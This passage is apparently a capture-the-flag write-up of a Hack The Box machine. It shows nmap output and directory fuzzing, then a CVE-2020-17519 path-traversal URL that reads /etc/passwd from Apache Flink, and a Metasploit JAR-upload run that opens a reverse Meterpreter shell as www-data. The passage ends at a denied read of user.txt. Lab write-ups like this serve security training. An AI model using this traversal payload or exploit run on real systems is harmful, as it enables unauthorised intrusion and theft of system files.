+SF:n</span><span class="se">\x</span><span class="s2">20writing,</span><span class="se">\x</span><span class="s2">20software</span><span class="se">\n\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20distributed</span><span class="se">\x</span><span class="s2">20under</span><span class="se">\x</span><span class="s2">20the</span><span class="se">\x</span><span class="s2">20
+SF:License</span><span class="se">\x</span><span class="s2">20is</span><span class="se">\x</span><span class="s2">20distributed</span><span class="se">\x</span><span class="s2">20on</span><span class="se">\x</span><span class="s2">20an</span><span class="se">\x</span><span class="s2">20</span><span class="se">\"</span><span class="s2">AS</span><span class="se">\x</span><span class="s2">20IS</span><span class="se">\"\x</span><span class="s2">20BASIS,</span><span class="se">\n\x</span><span class="s2">2
+SF:0</span><span class="se">\x</span><span class="s2">20~</span><span class="se">\x</span><span class="s2">20WITHOUT</span><span class="se">\x</span><span class="s2">20WARRANTIES</span><span class="se">\x</span><span class="s2">20OR</span><span class="se">\x</span><span class="s2">20CONDITIONS</span><span class="se">\x</span><span class="s2">20OF"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFou
+SF:rRequest,A7,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20appli
+SF:cation/json;</span><span class="se">\x</span><span class="s2">20charset=UTF-8</span><span class="se">\r\n</span><span class="s2">content-length:</span><span class="se">\x</span><span class="s2">2074</span><span class="se">\r\n\r\n</span><span class="s2">{</span><span class="se">\"</span><span class="s2">errors
+SF:</span><span class="se">\"</span><span class="s2">:</span><span class="se">\[\"</span><span class="s2">Unable</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20file</span><span class="se">\x</span><span class="s2">20/nice</span><span class="se">\x</span><span class="s2">20ports,/Tri
+SF:nity</span><span class="se">\.</span><span class="s2">txt</span><span class="se">\.</span><span class="s2">bak</span><span class="se">\.\"\]</span><span class="s2">}"</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,AE,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Fou
+SF:nd</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20application/json;</span><span class="se">\x</span><span class="s2">20charset=UTF-8</span><span class="se">\r\n</span><span class="s2">Access-Con
+SF:trol-Allow-Origin:</span><span class="se">\x</span><span class="s2">20</span><span class="se">\*\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20keep-alive</span><span class="se">\r\n</span><span class="s2">content-length
+SF::</span><span class="se">\x</span><span class="s2">2025</span><span class="se">\r\n\r\n</span><span class="s2">{</span><span class="se">\"</span><span class="s2">errors</span><span class="se">\"</span><span class="s2">:</span><span class="se">\[\"</span><span class="s2">Not</span><span class="se">\x</span><span class="s2">20found</span><span class="se">\.\"\]</span><span class="s2">}"</span><span class="o">)</span>%r<span class="o">(</span>WWWOFFLEctrlstat
+SF:,97,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\x</span><span class="s2">20Not</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20application/j
+SF:son;</span><span class="se">\x</span><span class="s2">20charset=UTF-8</span><span class="se">\r\n</span><span class="s2">content-length:</span><span class="se">\x</span><span class="s2">2058</span><span class="se">\r\n\r\n</span><span class="s2">{</span><span class="se">\"</span><span class="s2">errors</span><span class="se">\"</span><span class="s2">:</span><span class="se">\[\"</span><span class="s2">U
+SF:nable</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20requested</span><span class="se">\x</span><span class="s2">20file</span><span class="se">\x</span><span class="s2">20/bad-request</span><span class="se">\.\"\]</span><span class="s2">}"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+SF-Port46613-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>7/26%Time<span class="o">=</span>60FEBEF2%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>R
+SF:PCCheck,ACF,<span class="s2">"</span><span class="se">\0\0\n\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">dc</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\0\x</span><span class="s2">05sr</span><span class="se">\0</span><span class="s2">Korg</span><span class="se">\.</span><span class="s2">apac
+SF:he</span><span class="se">\.</span><span class="s2">flink</span><span class="se">\.</span><span class="s2">shaded</span><span class="se">\.</span><span class="s2">netty4</span><span class="se">\.</span><span class="s2">io</span><span class="se">\.</span><span class="s2">netty</span><span class="se">\.</span><span class="s2">handler</span><span class="se">\.</span><span class="s2">codec</span><span class="se">\.</span><span class="s2">TooLongFrameExcep
+SF:tion</span><span class="se">\x</span><span class="s2">e4M</span><span class="se">\|\x</span><span class="s2">b36</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\(\x</span><span class="s2">02</span><span class="se">\0\0</span><span class="s2">xr</span><span class="se">\0</span><span class="s2">Forg</span><span class="se">\.</span><span class="s2">apache</span><span class="se">\.</span><span class="s2">flink</span><span class="se">\.</span><span class="s2">shaded</span><span class="se">\.</span><span class="s2">nett
+SF:y4</span><span class="se">\.</span><span class="s2">io</span><span class="se">\.</span><span class="s2">netty</span><span class="se">\.</span><span class="s2">handler</span><span class="se">\.</span><span class="s2">codec</span><span class="se">\.</span><span class="s2">DecoderException</span><span class="sb">`</span><span class="se">\x</span>20<span class="se">\x</span>a4Dm<span class="se">\x</span>9d<span class="se">\x</span>f1<span class="se">\x</span>dc<span class="se">\</span>
+SF:x02<span class="se">\0\0</span>xr<span class="se">\0</span>Dorg<span class="se">\.</span>apache<span class="se">\.</span>flink<span class="se">\.</span>shaded<span class="se">\.</span>netty4<span class="se">\.</span>io<span class="se">\.</span>netty<span class="se">\.</span>handler<span class="se">\.</span>cod
+SF:ec<span class="se">\.</span>CodecException<span class="se">\x</span>eb<span class="se">\x</span>ab<span class="se">\x</span>e0<span class="se">\x</span>82<span class="se">\x</span>f5<span class="se">\x</span>86<span class="se">\x</span>b3<span class="se">\x</span>87<span class="se">\x</span>02<span class="se">\0\0</span>xr<span class="se">\0\x</span>1ajava<span class="se">\</span>
+SF:.lang<span class="se">\.</span>RuntimeException<span class="se">\x</span>9e_<span class="se">\x</span>06G<span class="se">\n</span>4<span class="se">\x</span>83<span class="se">\x</span>e5<span class="se">\x</span>02<span class="se">\0\0</span>xr<span class="se">\0\x</span>13java<span class="se">\.</span>lang<span class="se">\</span>
+SF:.Exception<span class="se">\x</span>d0<span class="se">\x</span>fd<span class="se">\x</span>1f&gt;<span class="se">\x</span>1a<span class="p">;</span><span class="se">\x</span>1c<span class="se">\x</span>c4<span class="se">\x</span>02<span class="se">\0\0</span>xr<span class="se">\0\x</span>13java<span class="se">\.</span>lang<span class="se">\.</span>Throwab
+SF:le<span class="se">\x</span>d5<span class="se">\x</span>c65<span class="s1">'9w\xb8\xcb\x03\0\x04L\0\x05causet\0\x15Ljava/lang/Throwable
+SF:;L\0\rdetailMessaget\0\x12Ljava/lang/String;\[\0\nstackTracet\0\x1e\[Lj
+SF:ava/lang/StackTraceElement;L\0\x14suppressedExceptionst\0\x10Ljava/util
+SF:/List;xpq\0~\0\nt\0@Adjusted\x20frame\x20length\x20exceeds\x20214748364
+SF:7:\x202147483688\x20-\x20discardedur\0\x1e\[Ljava\.lang\.StackTraceElem
+SF:ent;\x02F\*&lt;&lt;\xfd\"9\x02\0\0xp\0\0\0\x16sr\0\x1bjava\.lang\.StackTraceE
+SF:lementa\t\xc5\x9a&amp;6\xdd\x85\x02\0\x08B\0\x06formatI\0\nlineNumberL\0\x0
+SF:fclassLoaderNameq\0~\0\x07L\0\x0edeclaringClassq\0~\0\x07L\0\x08fileNam
+SF:eq\0~\0\x07L\0\nmethodNameq\0~\0\x07L\0\nmoduleNameq\0~\0\x07L\0\rmodul
+SF:eVersionq\0~\0\x07xp\x01\0\0\x02\x01t\0\x03appt\0Rorg\.apache\.flink\.s
+SF:haded\.netty4\.io\.netty\.")%r(Kerberos,C60,"\0\0\x0c`\xba\xdc\x0f\xfe\
+SF:x01\xac\xed\0\x05sr\0Forg\.apache\.flink\.shaded\.netty4\.io\.netty\.ha
+SF:ndler\.codec\.DecoderException`\x20\xa4Dm\x9d\xf1\xdc\x02\0\0xr\0Dorg\.
+SF:apache\.flink\.shaded\.netty4\.io\.netty\.handler\.codec\.CodecExceptio
+SF:n\xeb\xab\xe0\x82\xf5\x86\xb3\x87\x02\0\0xr\0\x1ajava\.lang\.RuntimeExc
+SF:eption\x9e_\x06G\n4\x83\xe5\x02\0\0xr\0\x13java\.lang\.Exception\xd0\xf
+SF:d\x1f&gt;\x1a;\x1c\xc4\x02\0\0xr\0\x13java\.lang\.Throwable\xd5\xc65'</span>9w<span class="se">\x</span>b
+SF:8<span class="se">\x</span>cb<span class="se">\x</span>03<span class="se">\0\x</span>04L<span class="se">\0\x</span>05causet<span class="se">\0\x</span>15Ljava/lang/Throwable<span class="p">;</span>L<span class="se">\0\r</span>detailMessa
+SF:get<span class="se">\0\x</span>12Ljava/lang/String<span class="p">;</span><span class="se">\[\0\n</span>stackTracet<span class="se">\0\x</span>1e<span class="se">\[</span>Ljava/lang/StackTra
+SF:ceElement<span class="p">;</span>L<span class="se">\0\x</span>14suppressedExceptionst<span class="se">\0\x</span>10Ljava/util/List<span class="p">;</span>xpsr<span class="se">\0\x</span>1fj
+SF:ava<span class="se">\.</span>lang<span class="se">\.</span>IllegalStateException<span class="se">\x</span>e6WU<span class="se">\x</span>e6<span class="se">\x</span>9aF<span class="se">\x</span>f2H<span class="se">\x</span>02<span class="se">\0\0</span>xq<span class="se">\0</span>~<span class="se">\0\x</span>02
+SF:q<span class="se">\0</span>~<span class="se">\0\x</span>0bt<span class="se">\0</span>:Network<span class="se">\x</span>20stream<span class="se">\x</span>20corrupted:<span class="se">\x</span>20received<span class="se">\x</span>20incorrect<span class="se">\</span>
+SF:x20magic<span class="se">\x</span>20number<span class="se">\.</span>ur<span class="se">\0\x</span>1e<span class="se">\[</span>Ljava<span class="se">\.</span>lang<span class="se">\.</span>StackTraceElement<span class="p">;</span><span class="se">\x</span>02F<span class="se">\*</span>&lt;&lt;<span class="se">\</span>
+SF:xfd<span class="se">\"</span>9<span class="se">\x</span>02<span class="se">\0\0</span>xp<span class="se">\0\0\0\x</span>12sr<span class="se">\0\x</span>1bjava<span class="se">\.</span>lang<span class="se">\.</span>StackTraceElementa<span class="se">\t\x</span>c5<span class="se">\</span>
+SF:x9a&amp;6<span class="se">\x</span><span class="nb">dd</span><span class="se">\x</span>85<span class="se">\x</span>02<span class="se">\0\x</span>08B<span class="se">\0\x</span>06formatI<span class="se">\0\n</span>lineNumberL<span class="se">\0\x</span>0fclassLoaderNa
+SF:meq<span class="se">\0</span>~<span class="se">\0\x</span>06L<span class="se">\0\x</span>0edeclaringClassq<span class="se">\0</span>~<span class="se">\0\x</span>06L<span class="se">\0\x</span>08fileNameq<span class="se">\0</span>~<span class="se">\0\x</span>06L<span class="se">\0</span>
+SF:<span class="se">\n</span>methodNameq<span class="se">\0</span>~<span class="se">\0\x</span>06L<span class="se">\0\n</span>moduleNameq<span class="se">\0</span>~<span class="se">\0\x</span>06L<span class="se">\0\r</span>moduleVersionq<span class="se">\0</span>~<span class="se">\0</span>
+SF:<span class="se">\x</span>06xp<span class="se">\x</span>01<span class="se">\0\0\0\x</span>dft<span class="se">\0\x</span>03appt<span class="se">\0</span>Jorg<span class="se">\.</span>apache<span class="se">\.</span>flink<span class="se">\.</span>runtime<span class="se">\.</span>io<span class="se">\.</span>netw
+SF:ork<span class="se">\.</span>netty<span class="se">\.</span>NettyMessage<span class="se">\$</span>NettyMessageDecodert<span class="se">\0\x</span>11NettyMe<span class="s2">");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=7/26%OT=22%CT=1%CU=42064%PV=Y%DS=2%DC=T%G=Y%TM=60FEBFE
+OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(
+OS:SP=FD%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=
+OS:M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE
+OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7
+OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
+OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
+OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
+OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 17.110 days (since Fri Jul  9 18:22:14 2021)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=253 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT       ADDRESS
+1   435.14 ms 10.10.14.1
+2   435.18 ms 10.129.85.134
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jul 26 21:00:11 2021 -- 1 IP address (1 host up) scanned in 1422.34 seconds
+</span></code></pre></div></div>
+
+<h1 id="enumeration">Enumeration</h1>
+<p>After we have results from nmap, we need to enumerate all open ports. In this case we found some ports such as:</p>
+<ul>
+  <li>Port 80 = Apache 2.4.1</li>
+  <li>Port 3306 = mysql/MariaDB</li>
+  <li>Port 8081 = Apache Flink Version: 1.11.2</li>
+  <li>Port 34655 = printer</li>
+  <li>Port 6123, 39845, 41129, 46431 = Apache Spark</li>
+  <li>Port 46613 = unknown</li>
+</ul>
+
+<p><strong>Port 80</strong></p>
+
+<p>Port 80 run web server technology <code class="language-plaintext highlighter-rouge">Apache 2.4.1</code>. The front page website
+<img src="/assets/images/htbbiz2021-level/port80-level.png" alt="Front Page" /></p>
+
+<p>enumerate directory/path using <code class="language-plaintext highlighter-rouge">ffuf</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt <span class="nt">-u</span> http://10.129.85.134/FUZZ <span class="nt">-mc</span> 200,301,302 <span class="nt">-e</span> .php.,txt.,html
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.172.157/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+ :: Extensions       : .php. txt. html 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,301,302
+________________________________________________
+
+search                  [Status: 302, Size: 330, Words: 60, Lines: 12]
+resources               [Status: 301, Size: 320, Words: 20, Lines: 10]
+themes                  [Status: 301, Size: 317, Words: 20, Lines: 10]
+admin                   [Status: 302, Size: 378, Words: 60, Lines: 12]
+start                   [Status: 200, Size: 16965, Words: 1826, Lines: 3]
+redirect                [Status: 302, Size: 366, Words: 60, Lines: 12]
+storage                 [Status: 301, Size: 318, Words: 20, Lines: 10]
+plugins                 [Status: 301, Size: 318, Words: 20, Lines: 10]
+database                [Status: 301, Size: 319, Words: 20, Lines: 10]
+language                [Status: 302, Size: 330, Words: 60, Lines: 12]
+app                     [Status: 301, Size: 314, Words: 20, Lines: 10]
+logout                  [Status: 302, Size: 330, Words: 60, Lines: 12]
+vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10]
+</span></code></pre></div></div>
+
+<p>go to <code class="language-plaintext highlighter-rouge">/admin</code> page
+<img src="/assets/images/htbbiz2021-level/HorizontCMS.png" alt="Horizont CMS" /></p>
+
+<p>We don’t have any informations about <code class="language-plaintext highlighter-rouge">HorizontCMS</code> from <code class="language-plaintext highlighter-rouge">searchploit</code>, and we found from <a href="https://packetstormsecurity.com/files/160046/HorizontCMS-1.0.0-beta-Shell-Upload.html">HorizontCMS 1.0.0-beta Shell Upload</a>, and <a href="https://www.rapid7.com/db/modules/exploit/multi/http/horizontcms_upload_exec/">HorizontCMS Arbitrary PHP File Upload</a>, but exploit need creds.</p>
+
+<p><strong>Port 8081</strong></p>
+
+<p>Port 8081 run web server technology <code class="language-plaintext highlighter-rouge">Apache Flink Version: 1.11.2</code>.
+<img src="/assets/images/htbbiz2021-level/apache-flink.png" alt="Apache flink" /></p>
+
+<p>Let’s enumerate <code class="language-plaintext highlighter-rouge">Apache Flink Version: 1.11.2</code> using <code class="language-plaintext highlighter-rouge">searchploit</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit <span class="s1">'Apache Flink'</span>
+<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                  |  Path
+<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Apache Flink 1.11.0 - Unauthenticated Arbitrary File Read <span class="o">(</span>Metasploit<span class="o">)</span>          | java/webapps/49398.rb
+Apache Flink 1.9.x - File Upload RCE <span class="o">(</span>Unauthenticated<span class="o">)</span>                          | java/webapps/48978.py
+<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+<p>or we also have from google</p>
+<ul>
+  <li><a href="https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/CVE-2020-17519%20Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md">CVE-2020-17519 Apache Flink</a></li>
+  <li><a href="https://github.com/murataydemir/CVE-2020-17519">Apache Flink RESTful API Arbitrary File Read</a></li>
+</ul>
+
+<p><strong>Apache Flink RESTful API Arbitrary File Read</strong></p>
+
+<p>Let’s try LFI <code class="language-plaintext highlighter-rouge">http://10.129.85.134:8081//jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</code>
+<img src="/assets/images/htbbiz2021-level/lfi.png" alt="Local File Inclusion" /></p>
+
+<h1 id="gaining-access">Gaining Access</h1>
+
+<p><strong>Apache Flink 1.11.0 - Unauthenticated Arbitrary File Read (Metasploit)</strong>
+run <code class="language-plaintext highlighter-rouge">metasploit -q</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole <span class="nt">-q</span>
+msf6 <span class="o">&gt;</span> search <span class="s1">'Apache Flink'</span>
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                                      Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                                      <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/multi/http/apache_flink_jar_upload_exec           2019-11-13       excellent  Yes    Apache Flink JAR Upload Java Code Execution
+   1  auxiliary/scanner/http/apache_flink_jobmanager_traversal  2021-01-05       normal     Yes    Apache Flink JobManager Traversal
+
+
+Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/apache_flink_jobmanager_traversal                                                                                                  
+
+msf6 <span class="o">&gt;</span> 
+</code></pre></div></div>
+<p>Let’s set our metasploit like this</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>SNIP]
+msf6 exploit<span class="o">(</span>multi/http/apache_flink_jar_upload_exec<span class="o">)</span> <span class="o">&gt;</span> options 
+
+Module options <span class="o">(</span>exploit/multi/http/apache_flink_jar_upload_exec<span class="o">)</span>:
+
+   Name     Current Setting  Required  Description
+   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   Proxies                   no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+   RHOSTS   10.129.85.134    <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'fil
+                                       e:&lt;path&gt;'</span>
+   RPORT    8081             <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SSL      <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
+   VHOST                     no        HTTP server virtual host
+
+
+Payload options <span class="o">(</span>java/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  tun0             <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Automatic
+
+
+msf6 <span class="o">&gt;</span> use exploit/multi/http/apache_flink_jar_upload_exec
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to java/meterpreter/reverse_tcp
+</code></pre></div></div>
+<p>type <code class="language-plaintext highlighter-rouge">run</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>SNIP]
+msf6 exploit<span class="o">(</span>multi/http/apache_flink_jar_upload_exec<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.172:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running automatic check <span class="o">(</span><span class="s2">"set AutoCheck false"</span> to disable<span class="o">)</span>
+<span class="o">[</span>+] The target appears to be vulnerable. Apache Flink version 1.11.2.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading JAR payload <span class="s1">'CphzzocTjEkT.jar'</span> <span class="o">(</span>5265 bytes<span class="o">)</span> ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrieving list of avialable JAR files ...
+<span class="o">[</span>+] Found uploaded JAR file <span class="s1">'dd95c87d-ef44-42db-a9fc-bc9e76cf714c_CphzzocTjEkT.jar'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing JAR payload <span class="s1">'dd95c87d-ef44-42db-a9fc-bc9e76cf714c_CphzzocTjEkT.jar'</span> entry class <span class="s1">'metasploit.Payload'</span> ...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>58060 bytes<span class="o">)</span> to 10.129.85.134
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.172:4444 -&gt; 10.129.85.134:48548<span class="o">)</span> at 2021-07-26 21:53:11 +0700
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Removing JAR file <span class="s1">'dd95c87d-ef44-42db-a9fc-bc9e76cf714c_CphzzocTjEkT.jar'</span> ...
+
+meterpreter <span class="o">&gt;</span> shell
+Process 1 created.
+Channel 1 created.
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+<span class="nb">whoami
+</span>www-data
+<span class="nb">cat</span> /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:112:119:MySQL Server,,,:/nonexistent:/bin/false
+albert:x:1000:1000:,,,:/home/albert:/bin/bash
+dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:116:122:user <span class="k">for </span>cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+rtkit:x:117:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
+geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:119:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+saned:x:120:128::/var/lib/saned:/usr/sbin/nologin
+colord:x:121:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+gdm:x:122:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
+</code></pre></div></div>
+<p>From <code class="language-plaintext highlighter-rouge">/etc/passwd</code> we navigate to <code class="language-plaintext highlighter-rouge">/home/albert</code> we need as <code class="language-plaintext highlighter-rouge">albert</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /home/albert
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+drwxr-xr-x 3 albert albert 4096 Jun 24 05:18 <span class="nb">.</span>
+drwxr-xr-x 3 root   root   4096 Jun 16 10:05 ..
+lrwxrwxrwx 1 albert albert    9 Jun 16 08:41 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 albert albert  220 Jun 16 08:41 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 albert albert 3797 Jun 16 08:41 .bashrc
+<span class="nt">-rw-r--r--</span> 1 albert albert  807 Jun 16 08:41 .profile
+drwx------ 2 albert albert 4096 Jun 16 09:58 .ssh
+<span class="nt">-r--------</span> 1 albert albert   29 Jun 24 05:18 user.txt
+<span class="nb">cat </span>user.txt
+<span class="nb">cat</span>: user.txt: Permission denied
+</code></pre></div></div>
+
